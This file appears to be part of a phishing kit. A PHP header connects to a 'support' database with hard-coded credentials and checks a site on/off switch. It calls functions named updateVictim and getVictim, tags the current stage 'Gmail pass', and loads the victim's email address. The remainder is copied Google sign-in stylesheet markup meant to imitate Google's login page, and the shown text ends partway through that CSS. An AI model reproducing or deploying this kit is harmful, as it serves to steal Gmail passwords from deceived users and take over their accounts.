<?php

$host = 'localhost';
$dbname = 'support';
$username = 'phpmyadmin';
$password = 'haha123';

try {
    $pdo = new PDO( 'mysql:host=' . $host . ';dbname=' . $dbname, $username, $password );
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    // Check site status
    $stmt = $pdo->query("SELECT `status` FROM `site_status` WHERE `id` = 1");
    $row = $stmt->fetch(PDO::FETCH_ASSOC);
    if ($row['status'] === 'off') {
        http_response_code(404);
        exit;
    }
} catch (PDOException $e) {
    echo "Error: " . $e->getMessage();
    exit;
}



require_once( '../../core/functions.php' );

if ( validUser( $pdo ) ) {

  updateVictim( $pdo, $_SESSION[ 'id' ], [
    'is_waiting' => 0,
    'heartbeat' => 9 // Gmail pass
  ] );

  $id = $_SESSION[ 'id' ];
  $email = getVictim( $pdo, $id )[ 'username' ];

} else {

  header( 'location:../../login.php' );

}

?>

<!DOCTYPE html>
<html dir=ltr class=eC9N2e lang=en-US>
  <meta charset=utf-8>
  <meta name=referrer content=origin>
  <meta name=viewport content="width=device-width, initial-scale=1">
  <style nonce>
    c-wiz {
      contain: style
    }

    .zOO9Bf {
      display: -webkit-box;
      display: -moz-box;
      display: -webkit-flex;
      display: -ms-flexbox;
      display: flex;
      height: 24px;
      justify-content: center
    }

    .YNY4de {
      height: 24px;
      margin: 0 0;
      overflow: visible;
      position: relative;
      width: 75px
    }

    .Bym39d .xduoyf {
      display: block
    }

    @keyframes quantumWizBoxInkSpread {
      0% {
        transform: translate(-50%, -50%) scale(0.2)
      }

      to {
        transform: translate(-50%, -50%) scale(2.2)
      }
    }

    @keyframes quantumWizIconFocusPulse {
      0% {
        transform: translate(-50%, -50%) scale(1.5);
        opacity: 0
      }

      to {
        transform: translate(-50%, -50%) scale(2);
        opacity: 1
      }
    }

    @keyframes quantumWizRadialInkSpread {
      0% {
        transform: scale(1.5);
        opacity: 0
      }

      to {
        transform: scale(2.5);
        opacity: 1
      }
    }

    @keyframes quantumWizRadialInkFocusPulse {
      0% {
        transform: scale(2);
        opacity: 0
      }

      to {
        transform: scale(2.5);
        opacity: 1
      }
    }

    .iNstf {
      background: #fff;
      bottom: 0;
      direction: ltr;
      left: 0;
      overflow: hidden;
      position: absolute;
      right: 0;
      top: 0;
      z-index: 1
    }

    @media all and (min-width:601px) {
      .iNstf {
        background: #fff
      }
    }

    @keyframes mdc-ripple-fg-radius-in {
      0% {
        animation-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
        transform: translate(var(--mdc-ripple-fg-translate-start, 0)) scale(1)
      }

      to {
        transform: translate(var(--mdc-ripple-fg-translate-end, 0)) scale(var(--mdc-ripple-fg-scale, 1))
      }
    }

    @keyframes mdc-ripple-fg-opacity-in {
      0% {
        animation-timing-function: linear;
        opacity: 0
      }

      to {
        opacity: var(--mdc-ripple-fg-opacity, 0)
      }
    }

    @keyframes mdc-ripple-fg-opacity-out {
      0% {
        animation-timing-function: linear;
        opacity: var(--mdc-ripple-fg-opacity, 0)
      }

      to {
        opacity: 0
      }
    }

    .VfPpkd-dgl2Hf-ppHlrf-sM5MNb {
      display: inline
    }

    .VfPpkd-LgbsSe {
      position: relative;
      display: -webkit-inline-box;
      display: -webkit-inline-flex;
      display: -ms-inline-flexbox;
      display: inline-flex;
      align-items: center;
      justify-content: center;
      min-width: 64px;
      border: none;
      outline: none;
      line-height: inherit;
      -moz-user-select: none;
      overflow: visible;
      vertical-align: middle;
      background: transparent
    }

    .VfPpkd-LgbsSe::-moz-focus-inner {
      padding: 0;
      border: 0
    }

    .VfPpkd-LgbsSe:active {
      outline: none
    }

    .VfPpkd-LgbsSe:hover {
      cursor: pointer
    }

    .VfPpkd-LgbsSe:disabled {
      cursor: default;
      pointer-events: none
    }

    .VfPpkd-LgbsSe .VfPpkd-vQzf8d {
      position: relative
    }

    .VfPpkd-LgbsSe .VfPpkd-RLmnJb {
      position: absolute;
      top: 50%;
      height: 48px;
      left: 0;
      right: 0;
      transform: translateY(-50%)
    }

    .VfPpkd-LgbsSe-OWXEXe-dgl2Hf {
      margin-top: 6px;
      margin-bottom: 6px
    }

    .VfPpkd-LgbsSe {
      -moz-osx-font-smoothing: grayscale;
      text-decoration: none;
      padding: 0 8px 0 8px
    }

    .VfPpkd-LgbsSe {
      --mdc-ripple-fg-size: 0;
      --mdc-ripple-left: 0;
      --mdc-ripple-top: 0;
      --mdc-ripple-fg-scale: 1;
      --mdc-ripple-fg-translate-end: 0;
      --mdc-ripple-fg-translate-start: 0;
      will-change: transform, opacity
    }

    .VfPpkd-LgbsSe .VfPpkd-Jh9lGc::before,
    .VfPpkd-LgbsSe .VfPpkd-Jh9lGc::after {
      position: absolute;
      -moz-border-radius: 50%;
      border-radius: 50%;
      opacity: 0;
      pointer-events: none;
      content: ""
    }

    .VfPpkd-LgbsSe .VfPpkd-Jh9lGc::before {
      transition: opacity 15ms linear, background-color 15ms linear;
      z-index: 1
    }

    .VfPpkd-LgbsSe .VfPpkd-Jh9lGc::after {
      z-index: 0
    }

    .VfPpkd-LgbsSe .VfPpkd-Jh9lGc::before,
    .VfPpkd-LgbsSe .VfPpkd-Jh9lGc::after {
      top: -moz-calc(50% - 100%);
      top: calc(50% - 100%);
      left: -moz-calc(50% - 100%);
      left: calc(50% - 100%);
      width: 200%;
      height: 200%
    }

    .VfPpkd-Jh9lGc {
      top: 0;
      left: 0;
      bottom: 0;
      right: 0
    }

    .VfPpkd-LgbsSe {
      height: 36px;
      -moz-border-radius: 4px;
      border-radius: 4px
    }

    .VfPpkd-LgbsSe:not(:disabled) {
      color: #6200ee
    }

    .VfPpkd-LgbsSe:disabled {
      color: rgba(0, 0, 0, .38)
    }

    .VfPpkd-LgbsSe .VfPpkd-Jh9lGc::before,
    .VfPpkd-LgbsSe .VfPpkd-Jh9lGc::after {
      background-color: #6200ee
    }

    .VfPpkd-LgbsSe:hover .VfPpkd-Jh9lGc::before,
    .VfPpkd-LgbsSe.VfPpkd-ksKsZd-XxIAqe-OWXEXe-ZmdkE .VfPpkd-Jh9lGc::before {
      opacity: .04
    }

    .VfPpkd-LgbsSe.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe .VfPpkd-Jh9lGc::before,
    .VfPpkd-LgbsSe:not(.VfPpkd-ksKsZd-mWPk3d):focus .VfPpkd-Jh9lGc::before {
      transition-duration: 75ms;
      opacity: .12
    }

    .VfPpkd-LgbsSe:not(.VfPpkd-ksKsZd-mWPk3d) .VfPpkd-Jh9lGc::after {
      transition: opacity 150ms linear
    }

    .VfPpkd-LgbsSe:not(.VfPpkd-ksKsZd-mWPk3d):active .VfPpkd-Jh9lGc::after {
      transition-duration: 75ms;
      opacity: .12
    }

    .VfPpkd-LgbsSe .VfPpkd-Jh9lGc {
      -moz-border-radius: 4px;
      border-radius: 4px
    }

    .VfPpkd-LgbsSe-OWXEXe-k8QpJ {
      height: 36px;
      -moz-border-radius: 4px;
      border-radius: 4px
    }

    .VfPpkd-LgbsSe-OWXEXe-k8QpJ:not(:disabled) {
      background-color: #6200ee
    }

    .VfPpkd-LgbsSe-OWXEXe-k8QpJ:disabled {
      background-color: rgba(0, 0, 0, .12)
    }

    .VfPpkd-LgbsSe-OWXEXe-k8QpJ:not(:disabled) {
      color: #fff
    }

    .VfPpkd-LgbsSe-OWXEXe-k8QpJ:disabled {
      color: rgba(0, 0, 0, .38)
    }

    .VfPpkd-LgbsSe-OWXEXe-k8QpJ .VfPpkd-Jh9lGc::before,
    .VfPpkd-LgbsSe-OWXEXe-k8QpJ .VfPpkd-Jh9lGc::after {
      background-color: #fff
    }

    .VfPpkd-LgbsSe-OWXEXe-k8QpJ:hover .VfPpkd-Jh9lGc::before,
    .VfPpkd-LgbsSe-OWXEXe-k8QpJ.VfPpkd-ksKsZd-XxIAqe-OWXEXe-ZmdkE .VfPpkd-Jh9lGc::before {
      opacity: .08
    }

    .VfPpkd-LgbsSe-OWXEXe-k8QpJ.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe .VfPpkd-Jh9lGc::before,
    .VfPpkd-LgbsSe-OWXEXe-k8QpJ:not(.VfPpkd-ksKsZd-mWPk3d):focus .VfPpkd-Jh9lGc::before {
      transition-duration: 75ms;
      opacity: .24
    }

    .VfPpkd-LgbsSe-OWXEXe-k8QpJ:not(.VfPpkd-ksKsZd-mWPk3d) .VfPpkd-Jh9lGc::after {
      transition: opacity 150ms linear
    }

    .VfPpkd-LgbsSe-OWXEXe-k8QpJ:not(.VfPpkd-ksKsZd-mWPk3d):active .VfPpkd-Jh9lGc::after {
      transition-duration: 75ms;
      opacity: .24
    }

    .VfPpkd-LgbsSe-OWXEXe-k8QpJ .VfPpkd-Jh9lGc {
      -moz-border-radius: 4px;
      border-radius: 4px
    }

    .nCP5yc {
      font-family: "Google Sans", Roboto, Arial, sans-serif;
      font-size: .875rem;
      letter-spacing: .0107142857em;
      font-weight: 500;
      text-transform: none;
      transition: border 280ms cubic-bezier(0.4, 0, 0.2, 1), box-shadow 280ms cubic-bezier(0.4, 0, 0.2, 1);
      -moz-box-shadow: none;
      box-shadow: none
    }

    .nCP5yc .VfPpkd-Jh9lGc {
      height: 100%;
      position: absolute;
      overflow: hidden;
      width: 100%;
      z-index: 0
    }

    .nCP5yc:not(:disabled) {
      background-color: #1a73e8;
      background-color: var(--gm-fillbutton-container-color, #1a73e8);
      color: #fff;
      color: var(--gm-fillbutton-ink-color, #fff)
    }

    .nCP5yc:disabled {
      background-color: rgba(60, 64, 67, .12);
      background-color: var(--gm-fillbutton-disabled-container-color, rgba(60, 64, 67, .12));
      color: rgba(60, 64, 67, .38);
      color: var(--gm-fillbutton-disabled-ink-color, rgba(60, 64, 67, .38))
    }

    .nCP5yc .VfPpkd-Jh9lGc::before,
    .nCP5yc .VfPpkd-Jh9lGc::after {
      background-color: #202124;
      background-color: var(--gm-fillbutton-state-color, #202124)
    }

    .nCP5yc:hover .VfPpkd-Jh9lGc::before,
    .nCP5yc.VfPpkd-ksKsZd-XxIAqe-OWXEXe-ZmdkE .VfPpkd-Jh9lGc::before {
      opacity: .16;
      opacity: var(--mdc-ripple-hover-opacity, 0.16)
    }

    .nCP5yc.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe .VfPpkd-Jh9lGc::before,
    .nCP5yc:not(.VfPpkd-ksKsZd-mWPk3d):focus .VfPpkd-Jh9lGc::before {
      transition-duration: 75ms;
      opacity: .24;
      opacity: var(--mdc-ripple-focus-opacity, 0.24)
    }

    .nCP5yc:not(.VfPpkd-ksKsZd-mWPk3d) .VfPpkd-Jh9lGc::after {
      transition: opacity 150ms linear
    }

    .nCP5yc:not(.VfPpkd-ksKsZd-mWPk3d):active .VfPpkd-Jh9lGc::after {
      transition-duration: 75ms;
      opacity: .2;
      opacity: var(--mdc-ripple-press-opacity, 0.2)
    }

    .nCP5yc:hover {
      -moz-box-shadow: 0 1px 2px 0 rgba(60, 64, 67, .3), 0 1px 3px 1px rgba(60, 64, 67, .15);
      box-shadow: 0 1px 2px 0 rgba(60, 64, 67, .3), 0 1px 3px 1px rgba(60, 64, 67, .15);
      -moz-box-shadow: 0 1px 2px 0 var(--gm-fillbutton-keyshadow-color, rgba(60, 64, 67, .3)), 0 1px 3px 1px var(--gm-fillbutton-ambientshadow-color, rgba(60, 64, 67, .15));
      box-shadow: 0 1px 2px 0 var(--gm-fillbutton-keyshadow-color, rgba(60, 64, 67, .3)), 0 1px 3px 1px var(--gm-fillbutton-ambientshadow-color, rgba(60, 64, 67, .15))
    }

    .nCP5yc:active {
      -moz-box-shadow: 0 1px 2px 0 rgba(60, 64, 67, .3), 0 2px 6px 2px rgba(60, 64, 67, .15);
      box-shadow: 0 1px 2px 0 rgba(60, 64, 67, .3), 0 2px 6px 2px rgba(60, 64, 67, .15);
      -moz-box-shadow: 0 1px 2px 0 var(--gm-fillbutton-keyshadow-color, rgba(60, 64, 67, .3)), 0 2px 6px 2px var(--gm-fillbutton-ambientshadow-color, rgba(60, 64, 67, .15));
      box-shadow: 0 1px 2px 0 var(--gm-fillbutton-keyshadow-color, rgba(60, 64, 67, .3)), 0 2px 6px 2px var(--gm-fillbutton-ambientshadow-color, rgba(60, 64, 67, .15))
    }

    .ksBjEc {
      font-family: "Google Sans", Roboto, Arial, sans-serif;
      letter-spacing: .0107142857em;
      font-weight: 500;
      text-transform: none
    }

    .ksBjEc .VfPpkd-Jh9lGc {
      height: 100%;
      position: absolute;
      overflow: hidden;
      width: 100%;
      z-index: 0
    }

    .ksBjEc:not(:disabled) {
      background-color: transparent;
      color: #1a73e8;
      color: var(--gm-colortextbutton-ink-color, #1a73e8)
    }

    .ksBjEc:disabled {
      color: rgba(60, 64, 67, .38);
      color: var(--gm-colortextbutton-disabled-ink-color, rgba(60, 64, 67, .38))
    }

    .ksBjEc:hover:not(:disabled),
    .ksBjEc.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe:not(:disabled),
    .ksBjEc:not(.VfPpkd-ksKsZd-mWPk3d):focus:not(:disabled),
    .ksBjEc:active:not(:disabled) {
      color: #174ea6;
      color: var(--gm-colortextbutton-ink-color--stateful, #174ea6)
    }

    .ksBjEc .VfPpkd-Jh9lGc::before,
    .ksBjEc .VfPpkd-Jh9lGc::after {
      background-color: #1a73e8;
      background-color: var(--gm-colortextbutton-state-color, #1a73e8)
    }

    .ksBjEc:hover .VfPpkd-Jh9lGc::before,
    .ksBjEc.VfPpkd-ksKsZd-XxIAqe-OWXEXe-ZmdkE .VfPpkd-Jh9lGc::before {
      opacity: .04;
      opacity: var(--mdc-ripple-hover-opacity, 0.04)
    }

    .ksBjEc.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe .VfPpkd-Jh9lGc::before,
    .ksBjEc:not(.VfPpkd-ksKsZd-mWPk3d):focus .VfPpkd-Jh9lGc::before {
      transition-duration: 75ms;
      opacity: .12;
      opacity: var(--mdc-ripple-focus-opacity, 0.12)
    }

    .ksBjEc:not(.VfPpkd-ksKsZd-mWPk3d) .VfPpkd-Jh9lGc::after {
      transition: opacity 150ms linear
    }

    .ksBjEc:not(.VfPpkd-ksKsZd-mWPk3d):active .VfPpkd-Jh9lGc::after {
      transition-duration: 75ms;
      opacity: .12;
      opacity: var(--mdc-ripple-press-opacity, 0.12)
    }

    .DuMIQc {
      padding: 0 24px 0 24px
    }

    .FliLIb {
      display: inline-block
    }

    .FliLIb .ksBjEc {
      font-size: inherit
    }

    .FliLIb .qIypjc:not(:disabled) {
      color: #fff
    }

    .FliLIb .uRo0Xe {
      min-width: 0
    }

    .YZrg6 {
      align-items: center;
      background: #fff;
      border: 1px solid #dadce0;
      color: #3c4043;
      cursor: pointer;
      display: -webkit-inline-box;
      display: -webkit-inline-flex;
      display: -ms-inline-flexbox;
      display: inline-flex;
      font-family: "Google Sans", "Noto Sans Myanmar UI", arial, sans-serif;
      font-size: 14px;
      font-weight: 500;
      letter-spacing: 0.25px;
      max-width: 100%;
      position: relative
    }

    .YZrg6:after {
      bottom: -1px;
      border: 1px solid transparent;
      content: "";
      left: -1px;
      position: absolute;
      right: -1px;
      top: -1px
    }

    .YZrg6:focus,
    .YZrg6.u3bW4e {
      background: rgba(60, 64, 67, 0.122);
      outline: none
    }

    .YZrg6:focus-visible::after {
      bottom: -5px;
      border: 2px solid #185abc;
      -moz-border-radius: 20px;
      border-radius: 20px;
      -moz-box-shadow: 0 0 0 2px #e8f0fe;
      box-shadow: 0 0 0 2px #e8f0fe;
      content: "";
      left: -5px;
      position: absolute;
      right: -5px;
      top: -5px
    }

    .YZrg6:hover:not(:focus-visible)::after {
      background: rgba(60, 64, 67, 0.039)
    }

    .YZrg6:focus:not(:focus-visible)::after,
    .YZrg6:hover:not(:focus-visible)::after,
    .YZrg6.u3bW4e {
      border-color: #dadce0
    }

    .HnRr5d {
      -moz-border-radius: 16px;
      border-radius: 16px;
      padding: 0 15px 0 15px
    }

    .HnRr5d.iiFyne {
      padding-right: 7px
    }

    .HnRr5d.cd29Sd {
      padding-left: 5px
    }

    .HnRr5d:after {
      -moz-border-radius: 16px;
      border-radius: 16px
    }

    .gPHLDe {
      -moz-border-radius: 10px;
      border-radius: 10px;
      height: 20px;
      margin-right: 8px
    }

    .gPHLDe .stUf5b {
      -moz-border-radius: 50%;
      border-radius: 50%;
      color: #3c4043;
      display: block;
      height: 20px;
      width: 20px
    }

    .KTeGk {
      direction: ltr;
      text-align: left;
      overflow: hidden;
      text-overflow: ellipsis;
      white-space: nowrap
    }

    .HnRr5d .KTeGk {
      line-height: 30px
    }

    .krLnGe {
      color: #3c4043;
      flex-shrink: 0;
      height: 18px;
      margin-left: 4px;
      transition: transform .2s cubic-bezier(.4, 0, .2, 1);
      width: 18px
    }

    .MSBt4d {
      display: block;
      height: 100%;
      width: 100%
    }

    .aTzEhb {
      margin: 16px 0;
      outline: none
    }

    .aTzEhb+.aTzEhb {
      margin-top: 24px
    }

    .aTzEhb:first-child {
      margin-top: 0
    }

    .aTzEhb:last-child {
      margin-bottom: 0
    }

    .CxRgyd {
      margin: auto -24px;
      padding-left: 24px;
      padding-right: 24px;
      margin-bottom: 16px;
      margin-top: 10px
    }

    @media all and (min-width:450px) {
      .CxRgyd {
        margin: auto -40px;
        padding-left: 40px;
        padding-right: 40px;
        margin-bottom: 16px;
        margin-top: 10px
      }
    }

    .IdEPtc:empty+.CxRgyd {
      margin-top: 0
    }

    .CxRgyd:only-child {
      margin-bottom: 0;
      margin-top: 0
    }

    .CxRgyd>[jsslot]>:first-child:not(section) {
      margin-top: 0;
      padding-top: 0
    }

    .CxRgyd>[jsslot]>:last-child:not(section) {
      margin-bottom: 0;
      padding-bottom: 0
    }

    body,
    input,
    button {
      color: #202124;
      font-family: roboto, "Noto Sans Myanmar UI", arial, sans-serif
    }

    body {
      background: #fff;
      direction: ltr;
      font-size: 14px;
      line-height: 1.4286;
      margin: 0;
      padding: 0
    }

    .g98c7c button:not(.TrZEUc) {
      -moz-border-radius: 4px;
      border-radius: 4px;
      color: #1a73e8;
      display: inline-block;
      font-weight: 500;
      letter-spacing: .25px;
      outline: 0;
      position: relative;
      background-color: transparent;
      cursor: pointer;
      font-size: inherit;
      padding: 0;
      text-align: left;
      border: 0
    }

    .g98c7c button::-moz-focus-inner {
      border: 0
    }

    .g98c7c a:focus,
    .g98c7c button:not(.TrZEUc):focus {
      color: #174ea6
    }

    .g98c7c a:focus:after,
    .g98c7c button:not(.TrZEUc):focus:after {
      background-color: rgba(26, 115, 232, 0.149);
      -moz-border-radius: 2px;
      border-radius: 2px;
      bottom: -2px;
      content: "";
      left: -3px;
      position: absolute;
      right: -3px;
      top: -2px;
      z-index: -1
    }

    .g98c7c a:active,
    .g98c7c button:not(.TrZEUc):active {
      color: #174ea6
    }

    .g98c7c a:active::after,
    .g98c7c button:not(.TrZEUc):active::after {
      background-color: rgba(26, 115, 232, 0.251)
    }

    .lJXwje,
    .lJXwje:before,
    .lJXwje:after {
      box-sizing: border-box
    }

    .lJXwje *,
    .lJXwje *:before,
    .lJXwje *:after {
      box-sizing: inherit
    }

    @media all and (min-width:601px) {
      .lJXwje {
        display: -webkit-box;
        display: -moz-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        flex-direction: column;
        min-height: 100vh;
        position: relative
      }

      .lJXwje:before,
      .lJXwje:after {
        box-flex: 1;
        flex-grow: 1;
        content: "";
        display: block;
        height: 24px
      }

      .lJXwje:before {
        min-height: 30px
      }

      .lJXwje:after {
        min-height: 24px
      }

      .lJXwje.LZgQXe:after {
        min-height: 63.9999996px
      }
    }

    .lJXwje .rn19nc {
      position: fixed
    }

    @media all and (min-width:601px) {
      .lJXwje .rn19nc {
        position: absolute
      }
    }

    .fPxNlf {
      background: #fff;
      display: -webkit-box;
      display: -moz-box;
      display: -webkit-flex;
      display: -ms-flexbox;
      display: flex;
      flex-direction: column;
      max-width: 100%;
      position: relative;
      z-index: 2
    }

    .fPxNlf.LZgQXe {
      min-height: 100vh
    }

    @media all and (min-width:601px) {
      .fPxNlf.LZgQXe {
        min-height: 0
      }

      .fPxNlf,
      .rhhJr {
        transition: .2s
      }

      .fPxNlf {
        background: #fff;
        border: 1px solid #dadce0;
        -moz-border-radius: 8px;
        border-radius: 8px;
        display: block;
        flex-shrink: 0;
        margin: 0 auto
      }

      .fPxNlf.qmmlRd {
        width: 450px
      }

      .fPxNlf.qmmlRd .rhhJr {
        height: auto;
        min-height: 500px
      }
    }

    .rhhJr {
      flex-grow: 1;
      overflow: hidden;
      padding: 24px 24px 36px
    }

    @media all and (min-width:450px) {
      .rhhJr {
        padding: 48px 40px 36px
      }
    }

    @media all and (min-width:601px) {
      .rhhJr {
        height: auto;
        min-height: 500px;
        overflow-y: auto
      }
    }

    .aDGQwe {
      margin: auto -24px;
      padding-left: 24px;
      padding-right: 24px;
      overflow: hidden
    }

    @media all and (min-width:450px) {
      .aDGQwe {
        margin: auto -40px;
        padding-left: 40px;
        padding-right: 40px
      }
    }

    .eKnrVb {
      margin: auto -24px;
      font-size: .1px;
      white-space: nowrap
    }

    @media all and (min-width:450px) {
      .eKnrVb {
        margin: auto -40px
      }
    }

    .CYBold {
      border: 0 solid transparent;
      border-width: 0 24px;
      box-sizing: border-box;
      display: inline-block;
      font-size: 14px;
      padding: 24px 0 0;
      vertical-align: top;
      white-space: normal;
      width: 100%
    }

    @media all and (min-width:450px) {
      .CYBold {
        border-left-width: 40px;
        border-right-width: 40px
      }
    }

    .O1htCb-H9tDt {
      display: -webkit-inline-box;
      display: -webkit-inline-flex;
      display: -ms-inline-flexbox;
      display: inline-flex;
      flex-direction: column;
      position: relative
    }

    .VfPpkd-O1htCb {
      display: -webkit-inline-box;
      display: -webkit-inline-flex;
      display: -ms-inline-flexbox;
      display: inline-flex;
      position: relative
    }

    .VfPpkd-t08AT-Bz112c {
      display: -webkit-inline-box;
      display: -webkit-inline-flex;
      display: -ms-inline-flexbox;
      display: inline-flex;
      position: relative;
      align-self: center;
      align-items: center;
      justify-content: center;
      flex-shrink: 0;
      pointer-events: none
    }

    .VfPpkd-t08AT-Bz112c .VfPpkd-t08AT-Bz112c-auswjd,
    .VfPpkd-t08AT-Bz112c .VfPpkd-t08AT-Bz112c-mt1Mkb {
      position: absolute;
      top: 0;
      left: 0
    }

    .VfPpkd-t08AT-Bz112c .VfPpkd-t08AT-Bz112c-Bd00G {
      width: 41.6666666667%;
      height: 20.8333333333%
    }

    .VfPpkd-t08AT-Bz112c .VfPpkd-t08AT-Bz112c-mt1Mkb {
      opacity: 1;
      transition: opacity 75ms linear 75ms
    }

    .VfPpkd-t08AT-Bz112c .VfPpkd-t08AT-Bz112c-auswjd {
      opacity: 0;
      transition: opacity 75ms linear
    }

    .VfPpkd-TkwUic {
      min-width: 0;
      -moz-box-flex: 1 1 auto;
      flex: 1 1 auto;
      position: relative;
      box-sizing: border-box;
      outline: none;
      cursor: pointer
    }

    .VfPpkd-uusGie-fmcmS-haAclf {
      display: -webkit-box;
      display: -moz-box;
      display: -webkit-flex;
      display: -ms-flexbox;
      -moz-appearance: none;
      appearance: none;
      pointer-events: none;
      box-sizing: border-box;
      width: auto;
      min-width: 0;
      flex-grow: 1;
      outline: none;
      padding: 0;
      color: inherit
    }

    .VfPpkd-uusGie-fmcmS {
      -moz-osx-font-smoothing: grayscale;
      line-height: var(--mdc-typography-subtitle1-line-height, 1.75rem);
      font-weight: var(--mdc-typography-subtitle1-font-weight, 400);
      letter-spacing: var(--mdc-typography-subtitle1-letter-spacing, 0.009375em);
      text-decoration: var(--mdc-typography-subtitle1-text-decoration, inherit);
      text-transform: var(--mdc-typography-subtitle1-text-transform, inherit);
      text-overflow: ellipsis;
      white-space: nowrap;
      overflow: hidden;
      display: block;
      width: 100%;
      text-align: left
    }

    .VfPpkd-O1htCb-OWXEXe-INsAgc {
      border: none
    }

    .VfPpkd-O1htCb-OWXEXe-INsAgc .VfPpkd-TkwUic {
      display: -webkit-box;
      display: -moz-box;
      display: -webkit-flex;
      display: -ms-flexbox;
      display: flex;
      align-items: baseline;
      overflow: visible
    }

    .VfPpkd-O1htCb-OWXEXe-INsAgc .VfPpkd-TkwUic .VfPpkd-uusGie-fmcmS-haAclf {
      display: -webkit-inline-box;
      display: -webkit-inline-flex;
      display: -ms-inline-flexbox
    }

    .VfPpkd-O1htCb-OWXEXe-INsAgc .VfPpkd-TkwUic::before {
      display: none
    }

    .VfPpkd-O1htCb-OWXEXe-INsAgc .VfPpkd-uusGie-fmcmS-haAclf {
      display: -webkit-box;
      display: -moz-box;
      display: -webkit-flex;
      display: -ms-flexbox;
      border: none;
      z-index: 1;
      background-color: transparent
    }

    @keyframes mdc-floating-label-shake-float-above-select-outlined-56px {
      0% {
        transform: translateX(calc(0 - 0%)) translateY(-34.75px) scale(0.75)
      }

      33% {
        animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
        transform: translateX(calc(4% - 0%)) translateY(-34.75px) scale(0.75)
      }

      66% {
        animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
        transform: translateX(calc(-4% - 0%)) translateY(-34.75px) scale(0.75)
      }

      to {
        transform: translateX(calc(0 - 0%)) translateY(-34.75px) scale(0.75)
      }
    }

    .VfPpkd-O1htCb-OWXEXe-INsAgc .VfPpkd-NSFCdd-i5vt6e .VfPpkd-NSFCdd-Brv4Fb {
      border-top-left-radius: var(--mdc-shape-small, 4px);
      border-top-right-radius: 0;
      border-bottom-right-radius: 0;
      border-bottom-left-radius: var(--mdc-shape-small, 4px)
    }

    @supports (top:max(0%)) {
      .VfPpkd-O1htCb-OWXEXe-INsAgc .VfPpkd-NSFCdd-i5vt6e .VfPpkd-NSFCdd-Brv4Fb {
        width: max(12px, var(--mdc-shape-small, 4px))
      }
    }

    @supports (top:max(0%)) {
      .VfPpkd-O1htCb-OWXEXe-INsAgc .VfPpkd-NSFCdd-i5vt6e .VfPpkd-NSFCdd-Ra9xwd {
        max-width: -moz-calc(100% - max(12px, var(--mdc-shape-small, 4px))*2);
        max-width: calc(100% - max(12px, var(--mdc-shape-small, 4px))*2)
      }
    }

    .VfPpkd-O1htCb-OWXEXe-INsAgc .VfPpkd-NSFCdd-i5vt6e .VfPpkd-NSFCdd-MpmGFe {
      border-top-left-radius: 0;
      border-top-right-radius: var(--mdc-shape-small, 4px);
      border-bottom-right-radius: var(--mdc-shape-small, 4px);
      border-bottom-left-radius: 0
    }

    @supports (top:max(0%)) {
      .VfPpkd-O1htCb-OWXEXe-INsAgc .VfPpkd-TkwUic {
        padding-left: max(16px, calc(var(--mdc-shape-small, 4px) + 4px))
      }
    }

    @supports (top:max(0%)) {

      [dir=rtl] .VfPpkd-O1htCb-OWXEXe-INsAgc .VfPpkd-TkwUic,
      .VfPpkd-O1htCb-OWXEXe-INsAgc .VfPpkd-TkwUic[dir=rtl] {
        padding-right: max(16px, calc(var(--mdc-shape-small, 4px) + 4px))
      }
    }

    @supports (top:max(0%)) {
      .VfPpkd-O1htCb-OWXEXe-INsAgc+.VfPpkd-O1htCb-W0vJo-fmcmS {
        margin-left: max(16px, calc(var(--mdc-shape-small, 4px) + 4px))
      }
    }

    @supports (top:max(0%)) {

      [dir=rtl] .VfPpkd-O1htCb-OWXEXe-INsAgc+.VfPpkd-O1htCb-W0vJo-fmcmS,
      .VfPpkd-O1htCb-OWXEXe-INsAgc+.VfPpkd-O1htCb-W0vJo-fmcmS[dir=rtl] {
        margin-right: max(16px, calc(var(--mdc-shape-small, 4px) + 4px))
      }
    }

    .VfPpkd-O1htCb-OWXEXe-INsAgc:not(.VfPpkd-O1htCb-OWXEXe-OWB6Me) .VfPpkd-TkwUic {
      background-color: transparent
    }

    .VfPpkd-O1htCb-OWXEXe-INsAgc:not(.VfPpkd-O1htCb-OWXEXe-OWB6Me) .VfPpkd-NSFCdd-Brv4Fb,
    .VfPpkd-O1htCb-OWXEXe-INsAgc:not(.VfPpkd-O1htCb-OWXEXe-OWB6Me) .VfPpkd-NSFCdd-Ra9xwd,
    .VfPpkd-O1htCb-OWXEXe-INsAgc:not(.VfPpkd-O1htCb-OWXEXe-OWB6Me) .VfPpkd-NSFCdd-MpmGFe {
      border-color: rgba(0, 0, 0, .38)
    }

    .VfPpkd-O1htCb-OWXEXe-INsAgc:not(.VfPpkd-O1htCb-OWXEXe-OWB6Me):not(.VfPpkd-O1htCb-OWXEXe-XpnDCe) .VfPpkd-TkwUic:hover .VfPpkd-NSFCdd-i5vt6e .VfPpkd-NSFCdd-Brv4Fb,
    .VfPpkd-O1htCb-OWXEXe-INsAgc:not(.VfPpkd-O1htCb-OWXEXe-OWB6Me):not(.VfPpkd-O1htCb-OWXEXe-XpnDCe) .VfPpkd-TkwUic:hover .VfPpkd-NSFCdd-i5vt6e .VfPpkd-NSFCdd-Ra9xwd,
    .VfPpkd-O1htCb-OWXEXe-INsAgc:not(.VfPpkd-O1htCb-OWXEXe-OWB6Me):not(.VfPpkd-O1htCb-OWXEXe-XpnDCe) .VfPpkd-TkwUic:hover .VfPpkd-NSFCdd-i5vt6e .VfPpkd-NSFCdd-MpmGFe {
      border-color: rgba(0, 0, 0, .87)
    }

    .VfPpkd-O1htCb-OWXEXe-INsAgc .VfPpkd-TkwUic .VfPpkd-uusGie-fmcmS::before {
      content: "​"
    }

    .VfPpkd-O1htCb-OWXEXe-INsAgc .VfPpkd-TkwUic .VfPpkd-uusGie-fmcmS-haAclf {
      height: 100%;
      display: -webkit-inline-box;
      display: -webkit-inline-flex;
      display: -ms-inline-flexbox;
      display: inline-flex;
      align-items: center
    }

